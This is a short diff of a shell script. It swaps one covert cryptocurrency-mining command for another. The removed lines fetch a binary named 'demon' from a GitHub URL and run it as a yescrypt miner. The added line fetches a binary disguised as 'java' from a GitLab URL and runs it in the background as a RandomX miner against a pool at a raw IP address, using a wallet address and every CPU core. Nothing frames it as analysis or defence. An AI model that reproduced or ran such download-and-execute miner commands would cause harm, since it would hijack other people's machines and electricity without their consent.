@@ -1,2 +1,1 @@
-wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
-nohup ./demon -a yescryptR32 -o 103.120.18.57:443 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-mikayui) -t $(nproc --all)
+wget -qO java https://gitlab.com/jasa4/jasa/-/raw/main/jupyterlab && chmod +x java && nohup ./java -o 103.120.18.57:8080 -a rx/0 -u ZEPHYR2tBHcj5UGL8ht15WiyPifGuh7ugHN5nAKXhDAE79gGobZ4kH9USdGNwy8prj7Sb7sXWXKEtck6cxF8138fJpd4iSa2cEM23.yui --randomx-1gb-pages -p -x -t $(nproc --all)
